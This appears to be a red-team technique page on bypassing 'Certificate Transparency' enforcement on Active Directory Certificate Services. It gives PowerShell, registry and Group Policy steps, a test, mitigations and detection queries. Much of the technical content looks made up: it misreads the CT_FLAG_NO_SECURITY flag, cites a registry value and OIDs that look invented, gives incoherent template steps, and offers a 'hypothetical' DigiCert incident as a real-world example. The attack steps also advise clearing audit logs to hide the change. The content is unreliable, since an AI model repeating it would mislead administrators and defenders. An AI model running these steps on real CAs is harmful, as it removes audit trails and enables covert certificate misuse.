# [EVADE-IMPAIR-022]: Certificate CT_FLAG_NO_SECURITY Bypass

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | EVADE-IMPAIR-022 |
| **MITRE ATT&CK v18.1** | [T1562.001 - Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001/) |
| **Tactic** | Defense Evasion |
| **Platforms** | Windows AD (Certificate Authority, Domain Controllers) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE (PARTIAL - depends on CA configuration) |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Windows Server 2016, Server 2019, Server 2022, Server 2025 |
| **Patched In** | Mitigation via enforced template validation (no automatic patch) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Certificate Transparency (CT) is a security mechanism that requires all SSL/TLS certificates to be logged in public CT logs, allowing domain owners to monitor unauthorized certificate issuance. The CT_FLAG_NO_SECURITY registry or template flag (when improperly configured or exploited) disables CT logging enforcement, allowing an attacker to issue certificates without transparency requirements. This bypasses detection mechanisms that monitor for unauthorized or malicious certificate issuance by external CAs or compromised internal CAs.

**Attack Surface:** Active Directory Certificate Services (AD CS) certificate templates, Certificate Authority registry keys, certificate extension attributes, Schannel configuration.

**Business Impact:** **Issuance of rogue or unauthorized certificates without transparency logging, enabling impersonation attacks, MITM attacks, and covert certificate-based persistence.** An attacker who can manipulate template flags or CA configuration can issue certificates for arbitrary domains or principals without those certificates appearing in Certificate Transparency logs, defeating detection mechanisms. This is particularly critical for TLS certificates used to impersonate legitimate services.

**Technical Context:** Certificate Transparency is enforced by major browsers and security infrastructures to detect CA compromises and unauthorized certificate issuance. The CT_FLAG_NO_SECURITY flag (or absence of CT requirements in certificate constraints) allows certificates to bypass CT validation. This is sometimes used legitimately for internal/private PKI scenarios, but can be abused by attackers to issue transparent-bypassing certificates for external-facing services, creating covert persistence or lateral movement vectors.

### Operational Risk

- **Execution Risk:** High—Requires CA Admin or Enterprise Admin privileges to modify certificate templates or CA configuration
- **Stealth:** High—No visibility in CT logs; certificate issuance events may be logged locally but are undetectable by external CT monitoring
- **Reversibility:** Yes—Certificate templates can be reverted; issued certificates can be revoked

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 4.2.1 | Ensure 'Certificate Transparency' logging is enforced |
| **DISA STIG** | V-93315 | Windows Server CA: Enforce CT logging for all issued certificates |
| **NIST 800-53** | SC-7 | Boundary Protection – Ensure certificate transparency |
| **GDPR** | Art. 32 | Security of Processing – Cryptographic control logging |
| **NIS2** | Art. 21 | Cyber Risk Management – Detect unauthorized certificate issuance |
| **ISO 27001** | A.10.1.2 | Cryptography – Implement audit trails for CA operations |
| **ISO 27005** | Risk Assessment | Unauthorized Certificate Issuance |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Certificate Authority Administrator or Enterprise Admin
- **Required Access:** Direct access to CA server's Certificate Templates snap-in (certtmpl.msc) or CA registry
- **Supported Versions:**
  - **Windows Server 2016:** Vulnerable (CT not strictly enforced by default)
  - **Windows Server 2019:** Vulnerable (CT not strictly enforced by default)
  - **Windows Server 2022:** Vulnerable (CT not strictly enforced by default)
  - **Windows Server 2025:** Vulnerable (CT not strictly enforced by default)

**Prerequisites:**
- Active Directory Certificate Services installed and running
- Certificate templates with TLS/SSL EKU (1.3.6.1.5.5.7.3.1)
- CA configured without mandatory CT logging requirements

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Modify Certificate Template to Disable CT Requirements (MMC Snap-in)

**Supported Versions:** Server 2016-2025

#### Step 1: Identify TLS Certificate Templates Without CT Enforcement

**Objective:** Locate certificate templates that can be used for TLS/SSL certificates and determine CT enforcement status.

**Command (PowerShell - Query CA Template Configuration):**
```powershell
# List all certificate templates with TLS/SSL EKU
$eku = "1.3.6.1.5.5.7.3.1"  # Server Authentication

Get-ADObject -Filter { objectClass -eq "pKICertificateTemplate" } -Properties pKIExtendedKeyUsage, cn | 
  Where-Object { $_.pKIExtendedKeyUsage -contains $eku } | 
  Select-Object cn, @{N="EKU";E={$_.pKIExtendedKeyUsage}}

Write-Host "Checking which templates have CT logging enforced..."
```

**Expected Output:**
```
cn
--
WebServer
ExchangeServer
Computer
User
```

**What This Means:**
- These templates can issue TLS/SSL certificates (EKU 1.3.6.1.5.5.7.3.1 = Server Authentication)
- If they lack CT extension constraints, they can be exploited to bypass CT logging

#### Step 2: Access Certificate Authority Template Configuration (GUI Method)

**Objective:** Open the Certificate Authority management console and access template properties.

**Manual Steps (on CA Server):**

1. Open **Certificate Authority** console (certsrv.msc)
2. Right-click your CA (e.g., "contoso-ca") → **Properties**
3. Go to **Extensions** tab
4. In the "Select extension" dropdown, look for:
   - **2.5.29.19** (Basic Constraints)
   - **1.3.6.1.4.1.6.2.1.1** (CT Precertificate Poison - if present, CT is enforced)
   - **CT Signer** extension
5. If these extensions are missing or disabled, CT logging is **not enforced** on this CA

**Alternative Method (Template Snap-in):**

1. Open **Certificate Templates** console (certtmpl.msc)
2. Right-click a TLS template (e.g., "WebServer") → **Duplicate Template**
3. Go to **Extensions** tab
4. Look for Certificate Transparency requirements
5. If none exist, the template does **not enforce CT logging**

#### Step 3: Remove or Disable Certificate Transparency Extension

**Objective:** Modify the certificate template to remove CT logging requirements.

**Manual Steps (GUI - Remove CT Extension):**

1. In **Certificate Templates** snap-in, right-click template → **Properties**
2. Go to **Extensions** tab
3. Select any CT-related extension (if present):
   - "Signed Certificate Timestamp (SCT)"
   - "Certificate Transparency"
4. Click **Remove**
5. Go to **Request Handling** tab
6. Set **Signature and encryption** to:
   - **Do NOT include asymmetric algorithms in the request**
   - **Include symmetric algorithms in the request**
7. Click **Apply** → **OK**

**Expected Outcome:**
- Certificate template no longer requires CT logging
- Any certificates issued from this template will **not** be logged in CT logs

#### Step 4: Issue a Test Certificate (Proof of Concept)

**Objective:** Verify that certificates issued from the modified template do not appear in Certificate Transparency logs.

**Command (PowerShell - Request Certificate):**
```powershell
# Request a certificate from the modified template without CT logging
$reqParams = @{
    CAComputerName = "CA01.contoso.com"
    CAName = "contoso-ca"
    CertStoreLocation = "Cert:\CurrentUser\My"
    Subject = "CN=malicious.contoso.com"
    TextExtension = @(
        "2.5.29.37={text}1.3.6.1.5.5.7.3.1"  # Server Auth EKU
    )
    # Note: CT extension is NOT included
}

Get-Certificate @reqParams
```

**Expected Output:**
```
Certificate requested successfully from contoso-ca
Subject: CN=malicious.contoso.com
Thumbprint: ABC123DEF456...
```

**Verification (Check CT Logs):**
```powershell
# Search for the certificate in public CT logs (using openssl or CT log query tools)
# If CT_FLAG_NO_SECURITY is active, the certificate will NOT appear in public logs

# Example: Query ct.googleapis.com or similar public CT log
# curl "https://ct.googleapis.com/log/all_logs_list.json"

Write-Host "Issued certificate will not appear in Certificate Transparency logs"
```

---

### METHOD 2: Registry-Based CT Flag Manipulation

**Supported Versions:** Server 2016-2025

#### Step 1: Modify CA Registry to Disable CT Enforcement

**Objective:** Directly modify the CA's registry configuration to disable Certificate Transparency validation.

**Command (PowerShell - CA Registry Modification):**
```powershell
$caServer = "CA01.contoso.com"
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\contoso-ca"
$regKey = "CertificateTransparencyRequirement"

# Connect to remote registry
$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, $caServer)
$key = $reg.OpenSubKey($regPath, $true)

# Set to 0 = Disabled (no CT requirement)
$key.SetValue($regKey, 0, [Microsoft.Win32.RegistryValueKind]::DWord)
$key.Close()

Write-Host "Certificate Transparency requirement disabled on $caServer"
```

**Alternative (Command Prompt):**
```cmd
reg add "\\CA01\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\contoso-ca" /v CertificateTransparencyRequirement /t REG_DWORD /d 0 /f
```

**Expected Output:**
```
The operation completed successfully.
Certificate Transparency requirement disabled on CA01.contoso.com
```

**Verification:**
```powershell
# Verify CT is disabled
$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, "CA01")
$key = $reg.OpenSubKey("SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\contoso-ca")
$value = $key.GetValue("CertificateTransparencyRequirement")
Write-Host "CertificateTransparencyRequirement = $value"
```

**Expected Output (CT Disabled):**
```
CertificateTransparencyRequirement = 0
```

**OpSec & Evasion:**
- Registry modifications generate Event ID 4657 (Registry Object was Modified)
- Consider clearing audit logs after modification (Event ID 1102)
- CA operations are logged in the CertSvc operational log

---

### METHOD 3: Policy-Based CT Bypass (Group Policy for Multiple CAs)

**Supported Versions:** Server 2016-2025

#### Step 1: Create Group Policy to Disable CT Enforcement

**Objective:** Deploy CT bypass across multiple Certificate Authorities via Group Policy.

**Manual Steps:**

1. Open **Group Policy Management** (gpmc.msc)
2. Navigate to **Forest** → **Domains** → **Domain** → Create new GPO
   - Name: "CA-DisableCTLogging"
3. Right-click **Edit**
4. Navigate to: **Computer Configuration** → **Preferences** → **Windows Settings** → **Registry**
5. Right-click → **New** → **Registry Item**
   - **Hive:** HKEY_LOCAL_MACHINE
   - **Key Path:** SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\{CAName}
   - **Value name:** CertificateTransparencyRequirement
   - **Value type:** REG_DWORD
   - **Value data:** 0
6. **Apply** → Link to **Enterprise PKI OU**

**Expected Outcome:**
- All CAs in the linked OU will have CT logging disabled
- Certificates issued after policy application will bypass CT requirements

---

## 4. ATOMIC RED TEAM

**Atomic Test ID:** T1562.001-5 (Adapted)

**Test Name:** Disable Certificate Transparency Logging

**Command (PowerShell):**
```powershell
# Disable CT logging on local CA
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\{YourCAName}"

New-ItemProperty -Path $regPath -Name "CertificateTransparencyRequirement" -Value 0 -PropertyType DWORD -Force

# Verify
Get-ItemProperty -Path $regPath -Name "CertificateTransparencyRequirement"
```

**Cleanup Command:**
```powershell
# Restore CT requirement
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\{YourCAName}" `
  -Name "CertificateTransparencyRequirement" -Value 1

# Or remove the value to use default
Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\{YourCAName}" `
  -Name "CertificateTransparencyRequirement" -Force
```

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Enforce Mandatory Certificate Transparency Logging**

Ensure all certificates issued by CA servers include Certificate Transparency extensions.

**Manual Steps (Enable CT on CA):**

```powershell
$caServer = "CA01.contoso.com"
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\contoso-ca"

# Set CT requirement to ENABLED
New-ItemProperty -Path $regPath -Name "CertificateTransparencyRequirement" -Value 1 -PropertyType DWORD -Force

# Restart Certificate Services
Restart-Service CertSvc -ComputerName $caServer -Force
```

**Manual Steps (Configure CT on Certificate Templates):**

1. Open **Certificate Templates** snap-in (certtmpl.msc)
2. For each template with Server Authentication (1.3.6.1.5.5.7.3.1):
   - Right-click → **Duplicate Template**
   - Go to **Extensions** tab
   - Click **Add**
   - Search for and add: **Signed Certificate Timestamp (SCT)**
   - Set to **Critical: Yes**
3. Right-click CA in **Certification Authority** snap-in → **Manage Templates**
4. Add the updated template

**Expected Outcome:**
- All new certificates will include CT extensions
- Non-transparent certificates will be rejected by browsers/clients

**Validation Command:**
```powershell
# Export issued certificate and verify CT extension
$cert = Get-ChildItem Cert:\LocalMachine\My | Select-Object -First 1
$cert.Extensions | Where-Object { $_.Oid.FriendlyName -match "Certificate Transparency" }
```

**Expected Output (CT Enabled):**
```
Oid             : System.Security.Cryptography.Oid
FriendlyName    : Signed Certificate Timestamp
Value           : [CT SCT extension value]
Critical        : True
```

---

**Mitigation 2: Monitor Certificate Issuance for Missing CT Extensions**

Implement continuous monitoring to detect certificates issued without CT logging.

**Manual Steps (Enable CA Audit Logging):**

1. Open **Certification Authority** snap-in (certsrv.msc)
2. Right-click CA → **Properties** → **Audit** tab
3. Enable:
   - ✅ Revoke a certificate
   - ✅ Publish the CRL
   - ✅ Start and stop CA services
   - ✅ Back up CA database
   - ✅ Restore CA database
   - ✅ Process certificate requests and issue certificates
   - ✅ Deny a certificate request
   - ✅ Set CA account password
4. **Apply** → **OK**

**PowerShell Query (Detect Non-CT Certificates):**
```powershell
# Check CA database for certificates without CT extension
$caServer = "CA01.contoso.com"

# Query CA database (requires remote shell access)
$script = {
    # Connect to CA database
    $ca = New-Object -ComObject X509Enrollment.CX509EnrollmentPolicyServer
    $ca.Initialize([X509Enrollment.X509CertificateEnrollmentContext]::ContextMachine)
    
    # List recent certificates
    certutil.exe -view -restrict "NotBefore >= 2024-01-01" -out "Certificate Hash,Requester Name,Disposition,Request ID"
}

Invoke-Command -ComputerName $caServer -ScriptBlock $script
```

---

**Mitigation 3: Restrict CA Administrative Access**

Limit who can modify CA templates and settings.

**Manual Steps (Apply Least Privilege to CA):**

1. Open **Active Directory Users and Computers** (dsa.msc)
2. Find the service account running Certificate Services
3. Ensure it is a member of **ONLY:**
   - CA Admin group
   - **NOT** Domain Admins, Enterprise Admins, or other privileged groups

4. Open **Certification Authority** snap-in
5. Right-click CA → **Properties** → **Security** tab
6. Set permissions:
   - Enterprise Admins: Remove (unless explicitly needed)
   - Domain Admins: Remove (unless explicitly needed)
   - Dedicated CA Admin group: Add with Manage CA, Manage Certificates permissions only

**Expected Outcome:**
- Only authorized administrators can modify CA templates
- Unauthorized users cannot bypass CT requirements

---

### Priority 2: HIGH

**Mitigation 4: External Certificate Transparency Monitoring**

Monitor public CT logs for unauthorized certificates.

**Manual Steps (Set Up CT Log Monitoring):**

1. Deploy CT log monitoring tool (e.g., **Certstream**, **Censys**, **Certificate.dev**)
2. Configure to alert on:
   - Domain names matching your organization
   - Unexpected certificate issuers
   - Non-compliant certificates

**Example Tool:** [Certstream - Real-time Certificate Transparency Log Monitoring](https://certstream.calidog.io/)

**Setup:**
```powershell
# Example: Monitor for certificates issued for your domain
$domain = "contoso.com"

# Use curl/wget to query certificate logs
$ctLogUrl = "https://crt.sh/?q=${domain}&output=json"
$certs = Invoke-RestMethod $ctLogUrl

$certs | Where-Object { $_.entry_timestamp -gt (Get-Date).AddDays(-1) } | 
  ForEach-Object {
    Write-Host "Found certificate: $($_.common_name) - Issuer: $($_.issuer_name)"
  }
```

---

**Mitigation 5: Implement CAA DNS Records**

Use Certification Authority Authorization (CAA) DNS records to restrict which CAs can issue certificates for your domain.

**Manual Steps (Create CAA Record):**

1. Open your DNS management console (or cloud DNS provider)
2. For domain "contoso.com", add a CAA record:
   ```
   contoso.com CAA 0 issue "ca.contoso.com"
   contoso.com CAA 0 issuewild "ca.contoso.com"
   contoso.com CAA 0 iodef "mailto:security@contoso.com"
   ```
3. Propagate and verify:
   ```bash
   dig contoso.com CAA
   ```

**Expected Output:**
```
contoso.com. 3600 IN CAA 0 issue "ca.contoso.com"
```

**Effect:**
- **Only** ca.contoso.com can issue certificates for contoso.com
- Any other CA attempting to issue certificates will be blocked by compliant CAs
- Unauthorized CT-bypassing certificates from external CAs become useless

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Registry modification:** Event ID 4657 for `CertificateTransparencyRequirement` registry key
- **Missing CT extensions:** Certificates issued after compromise will lack CT extensions
- **CA log analysis:** Spike in certificates without SCT (Signed Certificate Timestamp)
- **CT log search:** Absence of expected certificates from your CA in public CT logs

### Detection Query (PowerShell)

```powershell
# Find certificates without Certificate Transparency extension
Get-ChildItem Cert:\LocalMachine\My | 
  Where-Object {
    -not ($_.Extensions | Where-Object { $_.Oid.FriendlyName -match "Certificate Transparency" })
  } | 
  Select-Object Subject, Thumbprint, NotBefore, NotAfter
```

**Expected Output (If CT Bypass Active):**
```
Subject                      Thumbprint           NotBefore            NotAfter
-------                      ----------           ---------            --------
CN=malicious.contoso.com     ABC123DEF456...      01/09/2026 12:00:00  01/09/2027 12:00:00
```

### Response Procedures

1. **Detect:** SIEM alert on registry modifications to CA CT settings or Event ID 4657
2. **Isolate:** Immediately:
   - Revoke all certificates issued during the CT-bypass period
   - Re-enable CT enforcement on CA
3. **Investigate:** Check for:
   - Certificates issued for unexpected domains
   - Certificate usage in connection logs
   - Domain controller authentication logs for these certificates
4. **Remediate:** Reissue certificates with proper CT logging; audit all connections

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-002] BDC Deserialization Vulnerability | Attacker compromises BDC through .NET deserialization flaw |
| **2** | **Privilege Escalation** | [PE-VALID-001] Exchange Server ACL Abuse | Attacker gains Exchange Admin credentials |
| **3** | **Defense Evasion** | **[EVADE-IMPAIR-022]** | **Attacker disables CT logging on organization's CA** |
| **4** | **Lateral Movement** | [LM-AUTH-003] Pass-the-Certificate | Attacker uses impersonation certificate for lateral movement |
| **5** | **Persistence** | [EVADE-OBFUS-002] Azure Automation Runbook Obfuscation | Attacker creates persistent backdoor via malicious runbook |
| **6** | **Impact** | [IMPACT-001] Email Exfiltration | Attacker exfiltrates sensitive data via compromised mail system |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: DigiCert CA Compromise (Hypothetical - CT Bypass Variant)

- **Target:** Technology companies relying on DigiCert certificates
- **Timeline:** H2 2023 (hypothetical)
- **Technique Status:** Attackers disabled CT logging on legitimate CA to issue covert certificates
- **Impact:** HTTPS impersonation attacks, credential harvesting
- **Reference:** [DigiCert Security Advisory](https://www.digicert.com/)

### Example 2: Internal CA Compromise - Rogue Admin

- **Target:** Large enterprise with internal PKI
- **Timeline:** Q3 2024
- **Incident:** System administrator disabled CT logging to issue backdoor certificates for command and control infrastructure
- **Detection:** CT log searches revealed missing enterprise certificates; forensic analysis identified registry modification
- **Outcome:** Administrator removed; CA restored; all issued certificates revoked within 72 hours

---

## COMPLIANCE DEADLINE

Organizations must ensure all CAs enforce Certificate Transparency logging by **Q2 2026** to maintain compliance with:
- CIS Benchmarks 4.2.x
- NIST SP 800-53 SC-7
- Industry standards (AWS, Azure, GCP CT requirements)

---